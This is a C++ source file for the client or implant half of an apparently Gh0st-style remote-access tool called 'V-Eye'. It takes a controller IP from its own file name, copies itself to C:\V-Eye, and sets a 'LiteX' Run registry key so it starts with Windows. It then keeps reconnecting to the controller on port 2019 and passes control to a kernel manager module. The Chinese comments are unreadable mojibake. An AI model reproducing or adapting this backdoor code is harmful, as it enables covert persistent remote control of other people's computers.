
// Server.cpp : ����Ӧ�ó��������Ϊ��
//

#include "stdafx.h"
#include "Server.h"
#include "ServerDlg.h"

#include "KernelManager.h"
#include "Login.h"
#include <shellapi.h>
#include <direct.h>


#pragma comment(lib,"wininet.lib")
#pragma comment(lib, "vfw32.lib")

BOOL    bisUnInstall = FALSE;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define DEFAULT_SERVER _T("127.0.0.1")
#define SETTINGS_FILE _T("C:\\V-Eye\\V-Eye.ini")

int main()
{
    // ��ȡ���ߵ�ַ
    CHAR strAddr[MAX_PATH];
    GetPrivateProfileString(_T("Login"),_T("IPAddr"), DEFAULT_SERVER, strAddr, MAX_PATH, SETTINGS_FILE);

    // ���� ���ߵ�ַ
    HANDLE m_hMutex = CreateMutex(NULL, FALSE, strAddr);
    if (m_hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
        ReleaseMutex(m_hMutex);
        CloseHandle(m_hMutex);
        return 0;
    }

    CClientSocket SocketClient;
    int     nSleep = 0;
    bool	bBreakError = false;
    while (1) {
        if (bBreakError != false) {
            nSleep = rand();
            Sleep(nSleep % 120000);
        }
        if(bisUnInstall) {
            SocketClient.Disconnect();
            break;
        }

        char	lpszHost[256]= {0};
        UINT  	dwPort = 0;

        dwPort = 2019;
        strcat(lpszHost,strAddr);

        if(strcmp(lpszHost,"") == 0) {
            bBreakError = true;
            continue;
        }

        DWORD dwTickCount = GetTickCount();
        if (!SocketClient.Connect(lpszHost, dwPort)) {
            bBreakError = true;
            continue;
        }

        DWORD upTickCount = GetTickCount()-dwTickCount;
        CKernelManager	manager(&SocketClient,lpszHost,dwPort);

        SocketClient.SetManagerCallBack(&manager);

        if(SendLoginInfo(&SocketClient,upTickCount) <= 0) {
            SocketClient.Disconnect();
            bBreakError = true;
            continue;
        }

        DWORD	dwIOCPEvent;

        do {
            dwIOCPEvent = WaitForSingleObject(
                              SocketClient.m_hEvent,
                              100);
            Sleep(500);
        } while( dwIOCPEvent != WAIT_OBJECT_0 && !bisUnInstall);

        if(bisUnInstall) {
            SocketClient.Disconnect();
            break;
        }
    }

    return 0;
}


DWORD __stdcall MainThread()
{
    HANDLE hThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return 1;
}


// CServerApp

BEGIN_MESSAGE_MAP(CServerApp, CWinAppEx)
    ON_COMMAND(ID_HELP, &CWinApp::OnHelp)
END_MESSAGE_MAP()


// CServerApp ����

CServerApp::CServerApp()
{
    // TODO: �ڴ˴���ӹ�����룬
    // ��������Ҫ�ĳ�ʼ�������� InitInstance ��
}


// Ψһ��һ�� CServerApp ����

CServerApp theApp;


BOOL IsPathExist(const CString & csPath)
{
    WIN32_FILE_ATTRIBUTE_DATA attrs = { 0 };
    return 0 != GetFileAttributesEx(csPath, GetFileExInfoStandard, &attrs);
}

#include "MainDlg.h"
#include "resource.h"

// CServerApp ��ʼ��
BOOL CServerApp::InitInstance()
{
    CString strName = AfxGetApp()->m_pszAppName;
    int a = strName.ReverseFind('l');
    int b = strName.ReverseFind('v');
#ifdef _DEBUG
    CString strIP = DEFAULT_SERVER;
#else
    CString strIP = strName.Mid(a+2,b-a-3);
#endif

    if (strName.Find(_T("v1")) != -1) { //�����氲װ
        CMainDlg dlg;
        dlg.DoModal();
    }

    _mkdir(_T("C:\\V-Eye"));//����Ŀ¼

    if(strIP.GetLength() != 0) {
        WritePrivateProfileString(_T("Login"),_T("IPAddr"),strIP, SETTINGS_FILE);//д�����ߵ�ַ
    }

    if(IsPathExist(SETTINGS_FILE)) {
        char szRun[MAX_PATH]=_T("C:\\V-Eye\\V-Eye.exe");
        char szPath[MAX_PATH]= {0};
        GetModuleFileName(NULL,szPath,sizeof(szPath));
        MoveFile(szPath,szRun);

        char strSubKey[MAX_PATH] = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, _T("LiteX"), REG_SZ, szRun, lstrlen(szRun), 1);

        char strSubKey1[MAX_PATH] = _T("Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers");
        char strKey[MAX_PATH] = _T("RunAsInvoker");
        WriteRegEx(HKEY_CURRENT_USER, strSubKey1, szRun, REG_SZ, strKey, lstrlen(strKey), 1);
    }

    MainThread();

    return FALSE;
}
